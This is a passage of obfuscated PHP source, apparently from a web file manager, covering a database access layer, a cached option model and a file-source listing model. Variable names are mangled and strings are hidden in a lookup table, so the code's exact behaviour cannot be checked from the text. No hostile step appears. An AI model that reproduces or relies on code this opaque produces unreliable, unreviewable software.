$¾Ğ˜›ÎÏ . $ÁËØ ½Ì[913]; } else { $®·Û‹¾ = $ÁËØ ½Ì[914]; } } } $âÛÀö = $this->query($®·Û‹¾); $ı¶Õä„ = array(); foreach ($âÛÀö as $ÄË“œ¯ => $çÀİ¡ì) { $ı¶Õä„[$ÄË“œ¯] = current($çÀİ¡ì); } return $ı¶Õä„; } protected function parseLimit($¯ŸÆöøÄ) { $˜¥îûğÊ =& $_SERVER[şÒÁøÒÄ]; $©«‰Ü–É = $˜¥îûğÊ[12]; if (!empty($¯ŸÆöøÄ)) { switch ($this->dbType) { case $˜¥îûğÊ[957]: case $˜¥îûğÊ[949]: $¯ŸÆöøÄ = explode($˜¥îûğÊ[50], $¯ŸÆöøÄ); if (count($¯ŸÆöøÄ) > 1) { $©«‰Ü–É .= $˜¥îûğÊ[51] . $¯ŸÆöøÄ[1] . $˜¥îûğÊ[52] . $¯ŸÆöøÄ[0] . $˜¥îûğÊ[53]; } else { $©«‰Ü–É .= $˜¥îûğÊ[51] . $¯ŸÆöøÄ[0] . $˜¥îûğÊ[53]; } break; case $˜¥îûğÊ[930]: case $˜¥îûğÊ[948]: break; case $˜¥îûğÊ[932]: break; case $˜¥îûğÊ[931]: case $˜¥îûğÊ[933]: break; case $˜¥îûğÊ[960]: default: $©«‰Ü–É .= $˜¥îûğÊ[51] . $¯ŸÆöøÄ . $˜¥îûğÊ[53]; } } return $©«‰Ü–É; } public function parseKey(&$ö™­¶»Ú, $èœ£Ğš¸ = true) { $‹„•‹› =& $_SERVER[şÒÁøÒÄ]; if ($èœ£Ğš¸) { $ö™­¶»Ú = $this->parseKeyCheck($ö™­¶»Ú); } if ($this->dbType == $‹„•‹›[960]) { if ($ö™­¶»Ú != $‹„•‹›[189] && !preg_match($‹„•‹›[924], $ö™­¶»Ú)) { $ö™­¶»Ú = $‹„•‹›[385] . trim($ö™­¶»Ú, $‹„•‹›[385]) . $‹„•‹›[385]; } return $ö™­¶»Ú; } else { return parent::parseKey($ö™­¶»Ú, $èœ£Ğš¸); } } public function close() { $this->_linkID = null; } public function error() { $é¢Ğ²±© =& $_SERVER[şÒÁøÒÄ]; if ($this->PDOStatement) { $ü¦ÆÓô÷ = $this->PDOStatement->errorInfo(); $this->error = $ü¦ÆÓô÷[1] . $é¢Ğ²±©[4] . $ü¦ÆÓô÷[2]; } else { $this->error = $é¢Ğ²±©[12]; } if ($é¢Ğ²±©[12] != $this->queryStr) { $this->error .= LNG($é¢Ğ²±©[48]) . $this->queryStr; } think_trace($this->error, $é¢Ğ²±©[12], $é¢Ğ²±©[49]); return $this->error; } public function escapeString($™Ú‚ğ×œ) { $”ı¾å‡÷ =& $_SERVER[şÒÁøÒÄ]; switch ($this->dbType) { case $”ı¾å‡÷[957]: case $”ı¾å‡÷[930]: case $”ı¾å‡÷[948]: case $”ı¾å‡÷[960]: return addslashes($™Ú‚ğ×œ); case $”ı¾å‡÷[932]: case $”ı¾å‡÷[949]: case $”ı¾å‡÷[931]: case $”ı¾å‡÷[933]: return str_ireplace($”ı¾å‡÷[58], $”ı¾å‡÷[59], $™Ú‚ğ×œ); } } protected function parseValue($ìâ›óìÛ) { $ÛÍ¨’î =& $_SERVER[şÒÁøÒÄ]; if (is_string($ìâ›óìÛ)) { $–µñçú… = strpos($ìâ›óìÛ, $ÛÍ¨’î[4]) === 0 && in_array($ìâ›óìÛ, array_keys($this->bind)); $ìâ›óìÛ = $–µñçú… ? $this->escapeString($ìâ›óìÛ) : $ÛÍ¨’î[970] . $this->escapeString($ìâ›óìÛ) . $ÛÍ¨’î[970]; } elseif (isset($ìâ›óìÛ[0]) && is_string($ìâ›óìÛ[0]) && strtolower($ìâ›óìÛ[0]) == $ÛÍ¨’î[297]) { $ìâ›óìÛ = $this->escapeString($ìâ›óìÛ[1]); } elseif (is_array($ìâ›óìÛ)) { $ìâ›óìÛ = array_map(array($this, $ÛÍ¨’î[971]), $ìâ›óìÛ); } elseif (is_bool($ìâ›óìÛ)) { $ìâ›óìÛ = $ìâ›óìÛ ? $ÛÍ¨’î[88] : $ÛÍ¨’î[198]; } elseif (is_null($ìâ›óìÛ)) { $ìâ›óìÛ = $ÛÍ¨’î[103]; } return $ìâ›óìÛ; } public function getLastInsertId() { $ıÏÓòÛ =& $_SERVER[şÒÁøÒÄ]; switch ($this->dbType) { case $ıÏÓòÛ[957]: case $ıÏÓòÛ[949]: case $ıÏÓòÛ[930]: case $ıÏÓòÛ[948]: case $ıÏÓòÛ[932]: case $ıÏÓòÛ[960]: return $this->_linkID->lastInsertId(); case $ıÏÓòÛ[931]: case $ıÏÓòÛ[933]: $Õ¶¹Ş¾Œ = $this->table; $¨Ó¼Ú„ = $this->query("\123\x45\x4c\x45\x43\x54\40{$Õ¶¹Ş¾Œ}\x2e\143\x75\x72\162\x76\x61\154\40\143\x75\162\x72\166\x61\x6c\40\106\122\117\115\40\x64\165\x61\x6c"); return $¨Ó¼Ú„ ? $¨Ó¼Ú„[0][$ıÏÓòÛ[972]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($„×•çÉë) { $õ®¼¾È =& $_SERVER[şÒÁøÒÄ]; if (!CacheLock::fileLock($õ®¼¾È[13])) { return !1; } $ÇÚçÀœ´ = parent::query($„×•çÉë); CacheLock::fileUnLock($õ®¼¾È[13]); return $ÇÚçÀœ´; } public function execute($ò¼‘Û) { $±îïñ  =& $_SERVER[şÒÁøÒÄ]; if (!CacheLock::fileLock($±îïñ [13])) { return !1; } $å¶²İ«ş = parent::execute($ò¼‘Û); CacheLock::fileUnLock($±îïñ [13]); return $å¶²İ«ş; } } goto fÎ‡ÃŸ¦¡; FÁ†ÆÉÔí: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ı¬×²Ü = false, $ğşìß¿Û = '', $¥õŒ¯Ç = false) { $ñÂ¢Ëüë =& $_SERVER[şÒÁøÒÄ]; $æê†É› = $this->cacheGet($ğşìß¿Û); $ìæŒ£ùç = $this->optionDefault($ğşìß¿Û); $ìæŒ£ùç = is_array($ìæŒ£ùç) ? $ìæŒ£ùç : array(); if (is_array($æê†É›)) { $æê†É› = array_merge($ìæŒ£ùç, $æê†É›); return $ı¬×²Ü ? isset($æê†É›[$ı¬×²Ü]) ? $æê†É›[$ı¬×²Ü] : null : $æê†É›; } $†‰Ğ­ë€ = $this->filterWhere(array($ñÂ¢Ëüë[33] => $ğşìß¿Û)); $æê†É› = $this->where($†‰Ğ­ë€)->select(); $æê†É› = array_to_keyvalue($æê†É›, $ñÂ¢Ëüë[94], $ñÂ¢Ëüë[374]); foreach ($æê†É› as $…—À•á« => $–™ö”±ô) { if ($¥õŒ¯Ç || in_array($…—À•á«, $this->jsonField)) { $æê†É›[$…—À•á«] = json_decode($–™ö”±ô, !0); } } $this->cacheSet($ğşìß¿Û, $æê†É›); $æê†É› = array_merge($ìæŒ£ùç, $æê†É›); return $ı¬×²Ü ? $æê†É›[$ı¬×²Ü] : $æê†É›; } public function set($Ó¥‹»À¹, $ŒÁ‰Ãı€ = false, $¢Û†ü­Â = '') { $ğâïÍ·™ =& $_SERVER[şÒÁøÒÄ]; $this->cacheRemove($¢Û†ü­Â); $¥òì©Úò = array(); $Ù¦ÍÙ´ = is_array($Ó¥‹»À¹) ? $Ó¥‹»À¹ : array($Ó¥‹»À¹ => $ŒÁ‰Ãı€); foreach ($Ù¦ÍÙ´ as $ÊÏ“¿€Ó => $ÜÊŸ™¶µ) { if (is_array($ÜÊŸ™¶µ)) { $ÜÊŸ™¶µ = json_encode_force($ÜÊŸ™¶µ); } $this->checkLength($ÜÊŸ™¶µ, !1, $this->tableName . $ğâïÍ·™[4] . $Ó¥‹»À¹); $ÜÊŸ™¶µ = self::textEncode($ÜÊŸ™¶µ); $Ù¦ÍÙ´ = array($ğâïÍ·™[33] => $¢Û†ü­Â, $ğâïÍ·™[94] => $ÊÏ“¿€Ó, $ğâïÍ·™[374] => $ÜÊŸ™¶µ); $¥òì©Úò[] = $this->filterWhere($Ù¦ÍÙ´); } if (!$¥òì©Úò) { return !0; } $ÌÕß«ì = $this->cacheKey($ğâïÍ·™[400]); CacheLock::lock($ÌÕß«ì); $ºµ›†Ô’ = $this->addAll($¥òì©Úò, array(), !0); CacheLock::unlock($ÌÕß«ì); return $ºµ›†Ô’; } protected function optionDefault($ª­™Õ¹‚ = '') { return !1; } public function setDeep($Ø²Çá–ˆ, $‘ŸÄçç = false, $ºÔøÍàç = '') { $£Ø·›š¾ = explode($_SERVER[şÒÁøÒÄ][10], $Ø²Çá–ˆ); $´¨Ï´ÚÕ = $this->get(); array_set_value($´¨Ï´ÚÕ, $Ø²Çá–ˆ, $‘ŸÄçç); $this->set($£Ø·›š¾[0], $´¨Ï´ÚÕ[$£Ø·›š¾[0]], $ºÔøÍàç); } public function remove($ŸİŒ¢óÚ, $ş¯ÈØµ¸ = '') { $Ì’ì€¦ =& $_SERVER[şÒÁøÒÄ]; $this->cacheRemove($ş¯ÈØµ¸); $‰è¡ó›Ò = $this->filterWhere(array($Ì’ì€¦[94] => $ŸİŒ¢óÚ, $Ì’ì€¦[33] => $ş¯ÈØµ¸)); if (is_null($ŸİŒ¢óÚ)) { unset($‰è¡ó›Ò[$Ì’ì€¦[94]]); } return $this->where($‰è¡ó›Ò)->delete(); } public function cacheSet($¥¢Ï×ìõ, $›˜¤ÚÛë = false) { return Cache::set($this->cacheKey($¥¢Ï×ìõ), $›˜¤ÚÛë); } public function cacheGet($Å™°Êúí) { return Cache::get($this->cacheKey($Å™°Êúí)); } public function cacheRemove($”œ½’ãË) { return Cache::remove($this->cacheKey($”œ½’ãË)); } protected function filterWhere($ß’Ù×Ï—) { return $ß’Ù×Ï—; } protected function cacheKey($’ à®ø¥) { return $’ à®ø¥; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\x65"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\141\155\x65" => "\x69\157\137\163\157\x75\162\x63\x65\x5f\x6d\145\164\x61", "\x6d\x65\164\141\106\151\145\154\x64" => "\x73\157\165\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\155\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\x74", "\146\165\156\x63\x74\x69\157\x6e"), array("\x63\162\x65\141\x74\145\x54\151\155\145", "\x74\151\x6d\x65", "\151\156\x73\x65\x72\164", "\146\165\x6e\143\x74\151\157\156"), array("\x76\151\145\x77\124\151\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\164", "\146\x75\x6e\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($î³•ôùƒ) { return $this->listSource(array($_SERVER[şÒÁøÒÄ][401] => $î³•ôùƒ)); } public function typeName($…ÊÎèúŠ) { static $ùùí¡èó = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\155", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $ùùí¡èó[$…ÊÎèúŠ . $_SERVER[şÒÁøÒÄ][12]]; } public function sourceListInfo($©ĞÂœøÊ, $ÄÍÊµÉš = false) { $ÎÂ†Ç¼ =& $_SERVER[şÒÁøÒÄ]; $©ĞÂœøÊ = $©ĞÂœøÊ ? $©ĞÂœøÊ : array(); $©ĞÂœøÊ = array_filter(array_unique($©ĞÂœøÊ)); if (!$©ĞÂœøÊ) { return array(); } $ÇßØŸû = $this->where(array($ÎÂ†Ç¼[402] => array($ÎÂ†Ç¼[7], $©ĞÂœøÊ)))->select(); $this->_listDataApply($ÇßØŸû, $ÄÍÊµÉš); return array_to_keyvalue($ÇßØŸû, $ÎÂ†Ç¼[402]); } public function pathInfoFilter(&$¡„®†Ğè) { $É¥á£ˆ¾ =& $_SERVER[şÒÁøÒÄ]; static $Şú’˜—÷ = false; static $õãØ¬Êõ = false; static $„¨ó²ü = false; if (!$Şú’˜—÷) { $¥å—äã¨ = $É¥á£ˆ¾[403]; $¥å—äã¨ .= $É¥á£ˆ¾[404]; $¥å—äã¨ .= $É¥á£ˆ¾[405]; $öº€‘ª‡ = $É¥á£ˆ¾[406]; $ùîÓ¾é± = explode($É¥á£ˆ¾[50], $öº€‘ª‡); $Şú’˜—÷ = explode($É¥á£ˆ¾[50], $¥å—äã¨); $õãØ¬Êõ = array(); foreach ($Şú’˜—÷ as $ÎÔíéÌê) { if (in_array($ÎÔíéÌê, $ùîÓ¾é±)) { continue; } $õãØ¬Êõ[] = $ÎÔíéÌê; } $„¨ó²ü = explode($É¥á£ˆ¾[50], $É¥á£ˆ¾[407]); } foreach ($„¨ó²ü as $Äùå³£ñ) { if (isset($¡„®†Ğè[$Äùå³£ñ])) { $¡„®†Ğè[$Äùå³£ñ] = intval($¡„®†Ğè[$Äùå³£ñ]); } } $¡„®†Ğè[$É¥á£ˆ¾[84]] = $É¥á£ˆ¾[408] . $¡„®†Ğè[$É¥á£ˆ¾[402]] . $É¥á£ˆ¾[409]; $¡„®†Ğè[$É¥á£ˆ¾[33]] = $¡„®†Ğè[$É¥á£ˆ¾[410]] == 1 ? $É¥á£ˆ¾[75] : $É¥á£ˆ¾[200]; $¡„®†Ğè[$É¥á£ˆ¾[411]] = $this->typeName($¡„®†Ğè[$É¥á£ˆ¾[411]]); if ($¡„®†Ğè[$É¥á£ˆ¾[410]] != 1) { $¡„®†Ğè[$É¥á£ˆ¾[174]] = $¡„®†Ğè[$É¥á£ˆ¾[412]]; unset($¡„®†Ğè[$É¥á£ˆ¾[412]]); } $Òï¸îó” = $Şú’˜—÷; if (isset($¡„®†Ğè[$É¥á£ˆ¾[413]]) && $¡„®†Ğè[$É¥á£ˆ¾[413]][$É¥á£ˆ¾[414]] == -1) { $Òï¸îó” = $õãØ¬Êõ; } $¡„®†Ğè = array_field_key($¡„®†Ğè, $Òï¸îó”); return $¡„®†Ğè; } public function listUserFav() { $Ô¹½¸å® =& $_SERVER[şÒÁøÒÄ]; $ğ£ŞÊ = Model($Ô¹½¸å®[415])->listData(); $ìôô ¨¿ = array_filter_by_field($ğ£ŞÊ, $Ô¹½¸å®[33], $Ô¹½¸å®[416]); $ìôô ¨¿ = array_to_keyvalue($ìôô ¨¿, $Ô¹½¸å®[12], $Ô¹½¸å®[84]); if ($ìôô ¨¿) { $ıÌ“æĞœ = $this->listSource(array($Ô¹½¸å®[417] => array($Ô¹½¸å®[418], $ìôô ¨¿))); } $ıÌ“æĞœ = array_to_keyvalue($ıÌ“æĞœ[$Ô¹½¸å®[369]], $Ô¹½¸å®[402]); foreach ($ğ£ŞÊ as &$“ßºë¡) { $“ßºë¡ = array($Ô¹½¸å®[419] => $“ßºë¡[$Ô¹½¸å®[399]], $Ô¹½¸å®[420] => $“ßºë¡[$Ô¹½¸å®[32]], $Ô¹½¸å®[421] => $“ßºë¡[$Ô¹½¸å®[84]], $Ô¹½¸å®[422] => $“ßºë¡[$Ô¹½¸å®[33]], $Ô¹½¸å®[423] => $“ßºë¡[$Ô¹½¸å®[201]], $Ô¹½¸å®[424] => $“ßºë¡[$Ô¹½¸å®[85]]); if ($“ßºë¡[$Ô¹½¸å®[33]] == $Ô¹½¸å®[416] && $ıÌ“æĞœ[$“ßºë¡[$Ô¹½¸å®[84]]]) { $“ßºë¡[$Ô¹½¸å®[87]] = $ıÌ“æĞœ[$“ßºë¡[$Ô¹½¸å®[84]]]; } } unset($“ßºë¡); return $ğ£ŞÊ; } public function listUserTag($´ÓıÛˆ) { $µàƒÈÒß =& $_SERVER[şÒÁøÒÄ]; if ($´ÓıÛˆ && !is_array($´ÓıÛˆ)) { $´ÓıÛˆ = array($´ÓıÛˆ); } $£êØ€Ô = Model($µàƒÈÒß[425])->listData(); $€íâ›–× = array(); $µ´¾é Í = array(); foreach ($£êØ€Ô as $•ÆİË) { $öÉÉ«º = $•ÆİË[$µàƒÈÒß[84]]; if (!$öÉÉ«º) { continue; } if (!isset($µ´¾é Í[$öÉÉ«º])) { $µ´¾é Í[$öÉÉ«º] = array(); } $µ´¾é Í[$öÉÉ«º][] = $•ÆİË[$µàƒÈÒß[426]]; $€íâ›–×[$•ÆİË[$µàƒÈÒß[84]]] = $•ÆİË; } $ÊşÃ®±¬ = array(); $Ä”á‚İ¨ = array(); $÷Œœ™»ğ = array(); foreach ($µ´¾é Í as $Ğë§ĞÑï => $Éß»Ëê¸) { $äŸä—† = !0; if (!$´ÓıÛˆ) { $ÊşÃ®±¬[] = $Ğë§ĞÑï; continue; } foreach ($´ÓıÛˆ as $š¥ôºë) { if (!in_array($š¥ôºë, $Éß»Ëê¸)) { $äŸä—† = !1; break; } } if (!$äŸä—†) { continue; } if (!is_numeric($Ğë§ĞÑï)) { $•¨ç†Æ² = $€íâ›–×[$Ğë§ĞÑï]; $ ë¯ˆ¬¯ = array($µàƒÈÒß[32] => $•¨ç†Æ²[$µàƒÈÒß[32]], $µàƒÈÒß[84] => $•¨ç†Æ²[$µàƒÈÒß[84]], $µàƒÈÒß[33] => $•¨ç†Æ²[$µàƒÈÒß[33]], $µàƒÈÒß[87] => array($µàƒÈÒß[427] => 1), $µàƒÈÒß[202] => !0); if ($•¨ç†Æ²[$µàƒÈÒß[33]] == $µàƒÈÒß[200]) { $÷Œœ™»ğ[] = $ ë¯ˆ¬¯; } if ($•¨ç†Æ²[$µàƒÈÒß[33]] == $µàƒÈÒß[75]) { $Ä”á‚İ¨[] = $ ë¯ˆ¬¯; } continue; } $ÊşÃ®±¬[] = $Ğë§ĞÑï; } if ($ÊşÃ®±¬) { $¡Œ½£©‡ = $this->listSource(array($µàƒÈÒß[417] => array($µàƒÈÒß[418], $ÊşÃ®±¬))); } $¡Œ½£©‡ = $¡Œ½£©‡ ? $¡Œ½£©‡ : array($µàƒÈÒß[82] => array(), $µàƒÈÒß[83] => array()); $¡Œ½£©‡[$µàƒÈÒß[82]] = array_merge($¡Œ½£©‡[$µàƒÈÒß[82]], $Ä”á‚İ¨); $¡Œ½£©‡[$µàƒÈÒß[83]] = array_merge($¡Œ½£©‡[$µàƒÈÒß[83]], $÷Œœ™»ğ); if (isset($¡Œ½£©‡[$µàƒÈÒß[366]]) && count($ÊşÃ®±¬) == $¡Œ½£©‡[$µàƒÈÒß[366]][$µàƒÈÒß[367]]) { return $¡Œ½£©‡; } $ÌÏ·ªˆö = array(); $¡Õ¤öÛÄ = array_to_keyvalue($¡Œ½£©‡[$µàƒÈÒß[82]], $µàƒÈÒß[12], $µàƒÈÒß[402]); $ß¾¼ó™§ = array_to_keyvalue($¡Œ½£©‡[$µàƒÈÒß[83]], $µàƒÈÒß[12], $µàƒÈÒß[402]); $„©Ë¬İÄ = array_merge($ß¾¼ó™§, $¡Õ¤öÛÄ); foreach ($ÊşÃ®±¬ as $öÉÉ«º) { if (!in_array($öÉÉ«º, $„©Ë¬İÄ)) { $ÌÏ·ªˆö[] = $öÉÉ«º; } } if ($ÌÏ·ªˆö) { Model($µàƒÈÒß[428])->removeBySource($ÌÏ·ªˆö); } return $¡Œ½£©‡; } public function listUserRecycle() { $°±«öú¯ =& $_SERVER[şÒÁøÒÄ]; $êÆ´ËÃŸ = Model($°±«öú¯[429])->listData(); if (!$êÆ´ËÃŸ) { return array(); } $¦Œ§ûíÌ = array($°±«öú¯[417] => array($°±«öú¯[418], $êÆ´ËÃŸ), $°±«öú¯[430] => 1); return $this->listSource($¦Œ§ûíÌ); } public function listSource($ªÀûÉï, $é‚ê­ê = 3000, $‚äû¦©Ì = false) { $é÷Å­şç =& $_SERVER[şÒÁøÒÄ]; if (!isset($ªÀûÉï[$é÷Å­şç[431]])) { $ªÀûÉï[$é÷Å­şç[431]] = 0; } if (isset($ªÀûÉï[$é÷Å­şç[432]]) && $ªÀûÉï[$é÷Å­şç[432]] == $é÷Å­şç[198]) { $ªÀûÉï[$é÷Å­şç[412]] = array($é÷Å­şç[331], $é÷Å­şç[433]); } $€ÇˆúÛö = $é÷Å­şç[434]; $ÑøÚŒ¡“ = $this->field($€ÇˆúÛö)->_makeOrder()->where($ªÀûÉï)->selectPage($é‚ê­ê); $this->_listPageCheck($ÑøÚŒ¡“, $€ÇˆúÛö, $ªÀûÉï); $this->_listDataApply($ÑøÚŒ¡“[$é÷Å­şç[369]], $‚äû¦©Ì); $this->_listMake($ÑøÚŒ¡“); return $ÑøÚŒ¡“; } private function _listPageCheck(&$Ü–¥°¾‹, $ô©û°±ë, $Õˆ¶Áö) { $ş£»Ñ =& $_SERVER[şÒÁøÒÄ]; if (!is_array($Ü–¥°¾‹[$ş£»Ñ[366]])) { return; } $¤Ÿ¨Ù¿ = $Ü–¥°¾‹[$ş£»Ñ[366]]; if ($¤Ÿ¨Ù¿[$ş£»Ñ[368]] <= 1) { return; } if ($¤Ÿ¨Ù¿[$ş£»Ñ[367]] >= 100000) { return; } if (Model($ş£»Ñ[435])->get($ş£»Ñ[436]) != $ş£»Ñ[437]) { return; } $ô©û°±ë = str_replace(array($ş£»Ñ[53], $ş£»Ñ[342], $ş£»Ñ[231]), $ş£»Ñ[12], $ô©û°±ë); $ô©û°±ë = $ş£»Ñ[438] . str_replace($ş£»Ñ[50], $ş£»Ñ[439], $ô©û°±ë) . $ş£»Ñ[440]; $‡êÉ”»Ÿ = $ş£»Ñ[441]; $‡êÉ”»Ÿ = $‡êÉ”»Ÿ . $ş£»Ñ[442]; $ù‘å¾Óğ = $¤Ÿ¨Ù¿[$ş£»Ñ[363]] * ($¤Ÿ¨Ù¿[$ş£»Ñ[353]] - 1) . $ş£»Ñ[50] . $¤Ÿ¨Ù¿[$ş£»Ñ[363]]; $Œ—®Ò³ = $this->_makeOrder(!0); $ÖöÌ¹‚ò = $ş£»Ñ[438] . str_replace($ş£»Ñ[50], $ş£»Ñ[439], $Œ—®Ò³[0]); if (strpos($ÖöÌ¹‚ò, $ş£»Ñ[443])) { $ÖöÌ¹‚ò = str_replace($ş£»Ñ[443], $ş£»Ñ[444], $ÖöÌ¹‚ò); } else { $ÖöÌ¹‚ò .= $ş£»Ñ[445] . $Œ—®Ò³[1]; } $äŠ×•Š = array(); foreach ($Õˆ¶Áö as $Öƒ•øØ€ => $ŞÑ ¢ ·) { $äŠ×•Š[$ş£»Ñ[438] . $Öƒ•øØ€] = $ŞÑ ¢ ·; } $this->alias($ş£»Ñ[446])->field($ô©û°±ë)->limit($ù‘å¾Óğ)->order($ÖöÌ¹‚ò); $öİ‹Àô‡ = $this->join($‡êÉ”»Ÿ)->where($äŠ×•Š)->select(); if ($öİ‹Àô‡) { $Ü–¥°¾‹[$ş£»Ñ[369]] = $öİ‹Àô‡; } } protected function _makeOrder($ÅıÉ¨˜š = false) { $øæ‡Á´† =& $_SERVER[şÒÁøÒÄ]; $‡Ä‡¸®ô = Model($øæ‡Á´†[447])->get($øæ‡Á´†[448]); $àòùÊ·Ò = Model($øæ‡Á´†[447])->get($øæ‡Á´†[449]); $‰šÆĞªİ = array($øæ‡Á´†[450] => $øæ‡Á´†[451], $øæ‡Á´†[452] => $øæ‡Á´†[453]); $ûï‘çæˆ = array($øæ‡Á´†[32] => $øæ‡Á´†[32], $øæ‡Á´†[76] => $øæ‡Á´†[76], $øæ‡Á´†[174] => $øæ‡Á´†[412], $øæ‡Á´†[454] => $øæ‡Á´†[454], $øæ‡Á´†[455] => $øæ‡Á´†[456], $øæ‡Á´†[201] => $øæ‡Á´†[201], $øæ‡Á´†[85] => $øæ‡Á´†[85]); $ºú¤Øß¥ = Input::get($øæ‡Á´†[457], $øæ‡Á´†[7], $‡Ä‡¸®ô, array_keys($ûï‘çæˆ)); $Ô×â€Ø = Input::get($øæ‡Á´†[458], $øæ‡Á´†[7], $àòùÊ·Ò, array_keys($‰šÆĞªİ)); if (!in_array($ºú¤Øß¥, array_keys($ûï‘çæˆ))) { $ºú¤Øß¥ = $øæ‡Á´†[32]; } if (!in_array($Ô×â€Ø, array_keys($‰šÆĞªİ))) { $ºú¤Øß¥ = $øæ‡Á´†[450]; } if ($ºú¤Øß¥ == $øæ‡Á´†[32]) { } $Êˆ™ùıµ = $øæ‡Á´†[459] . $ûï‘çæˆ[$ºú¤Øß¥] . $øæ‡Á´†[53] . $‰šÆĞªİ[$Ô×â€Ø]; $Êˆ™ùıµ = rtrim(trim($Êˆ™ùıµ), $øæ‡Á´†[50]); if ($ÅıÉ¨˜š) { return array($Êˆ™ùıµ, $‰šÆĞªİ[$Ô×â€Ø]); } return $this->order($Êˆ™ùıµ); } protected function _listDataApplyItem($ìŠòÊ, $ØˆçáØÓ = false) { $àß³²˜ù = array($ìŠòÊ); $this->_listDataApply($àß³²˜ù, $ØˆçáØÓ); return $àß³²˜ù[0]; } protected function _listDataApply(&$ã™Ú»ƒ, $¿ô·ßî© = false) { $ÙÀ¼ï‰ =& $_SERVER[şÒÁøÒÄ]; if (!$ã™Ú»ƒ) { $ã™Ú»ƒ = array(); return; } $‹ïİ‚ïû = array_to_keyvalue($ã™Ú»ƒ, $ÙÀ¼ï‰[12], $ÙÀ¼ï‰[402]); $‹ïİ‚ïû = array_unique($‹ïİ‚ïû); $this->_listSourceCache($ã™Ú»ƒ); if (!$¿ô·ßî©) { $this->_listAppendMeta($ã™Ú»ƒ, $‹ïİ‚ïû); $this->_listAppendFileMeta($ã™Ú»ƒ, $‹ïİ‚ïû); $this->_listAppendChildren($ã™Ú»ƒ, $‹ïİ‚ïû); } $this->_listAppendPath($ã™Ú»ƒ); $this->_listAppendAuth($ã™Ú»ƒ); $this->_listAppendSourceInfo($ã™Ú»ƒ, $‹ïİ‚ïû); $this->_listAppendUser($ã™Ú»ƒ); $this->_listFilterInfo($ã™Ú»ƒ, $¿ô·ßî©); $this->_listAppendAuthSecret($ã™Ú»ƒ); } protected function _listSourceCache($Ñµêæà) { $šŸéĞĞÂ =& $_SERVER[şÒÁøÒÄ]; foreach ($Ñµêæà as $ÈÃˆ÷Å) { self::$cacheSourceInfo[$šŸéĞĞÂ[460] . $ÈÃˆ÷Å[$šŸéĞĞÂ[402]]] = $ÈÃˆ÷Å; } } protected function _listFilterInfo(&$ÇÁÌüëå, $ææÑ½½‹ = false) { $Öƒœ£Ú¨ =& $_SERVER[şÒÁøÒÄ]; foreach ($ÇÁÌüëå as &$ÒñãÙÇÕ) { $ÒñãÙÇÕ = $this->pathInfoFilter($ÒñãÙÇÕ); self::$cachePathInfo[$Öƒœ£Ú¨[461] . intval($ææÑ½½‹) . $Öƒœ£Ú¨[386] . $ÒñãÙÇÕ[$Öƒœ£Ú¨[402]]] = $ÒñãÙÇÕ; } unset($ÒñãÙÇÕ); } protected function _listMake(&$ø¦”Ì÷µ) { $ü—²Ó³Ç =& $_SERVER[şÒÁøÒÄ]; $ø¦”Ì÷µ[$ü—²Ó³Ç[82]] = array(); $ø¦”Ì÷µ[$ü—²Ó³Ç[83]] = array(); foreach ($ø¦”Ì÷µ[$ü—²Ó³Ç[369]] as $°£ÊÔ˜) { $¸¹ß­§ = $°£ÊÔ˜[$ü—²Ó³Ç[410]] == 1 ? $ü—²Ó³Ç[82] : $ü—²Ó³Ç[83]; $ø¦”Ì÷µ[$¸¹ß­§][] = $°£ÊÔ˜; } unset($ø¦”Ì÷µ[$ü—²Ó³Ç[369]]); } protected function _listAppendMeta(&$ö£‹ı—Ñ, $Úïºµ¬Ì) { $¾“Ï¥î =& $_SERVER[şÒÁøÒÄ]; $…õµ¤Ó = array($¾“Ï¥î[417] => array($¾“Ï¥î[418], $Úïºµ¬Ì)); $´ÊøÔÒˆ = Model($¾“Ï¥î[462])->field($¾“Ï¥î[463])->where($…õµ¤Ó)->select(); if (!$´ÊøÔÒˆ) { return; } $¡ÎëÓâ = array($¾“Ï¥î[464], $¾“Ï¥î[465], $¾“Ï¥î[444]); $Á®Î¼×Ø = array(); foreach ($´ÊøÔÒˆ as $¤ÃşÜí) { if (!isset($Á®Î¼×Ø[$¤ÃşÜí[$¾“Ï¥î[402]]])) { $Á®Î¼×Ø[$¤ÃşÜí[$¾“Ï¥î[402]]] = array(); } if (in_array($¤ÃşÜí[$¾“Ï¥î[94]], $¡ÎëÓâ)) { continue; } $Á®Î¼×Ø[$¤ÃşÜí[$¾“Ï¥î[402]]][$¤ÃşÜí[$¾“Ï¥î[94]]] = $¤ÃşÜí[$¾“Ï¥î[374]]; } foreach ($ö£‹ı—Ñ as &$¯Ï”º¥™) { $¯Ï”º¥™[$¾“Ï¥î[466]] = !1; if (isset($Á®Î¼×Ø[$¯Ï”º¥™[$¾“Ï¥î[402]]])) { $¯Ï”º¥™[$¾“Ï¥î[466]] = $Á®Î¼×Ø[$¯Ï”º¥™[$¾“Ï¥î[402]]]; } if ($this->fileIsLock($¯Ï”º¥™) && $¯Ï”º¥™[$¾“Ï¥î[413]]) { $‡Œ’û¼ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¯Ï”º¥™[$¾“Ï¥î[413]][$¾“Ï¥î[414]] = AuthModel::authDisable($¯Ï”º¥™[$¾“Ï¥î[413]][$¾“Ï¥î[414]], $‡Œ’û¼); $¯Ï”º¥™[$¾“Ï¥î[413]][$¾“Ï¥î[467]][$¾“Ï¥î[413]] = $¯Ï”º¥™[$¾“Ï¥î[413]][$¾“Ï¥î[414]]; } } unset($¯Ï”º¥™); } protected function _listAppendFileMeta(&$‚Úİé¹ï, $¡Ï å¾) { $»¿ö×•  =& $_SERVER[şÒÁøÒÄ]; $¸ë÷ê‹© = array_to_keyvalue($‚Úİé¹ï, $»¿ö×• [12], $»¿ö×• [468]); $¸ë÷ê‹© = 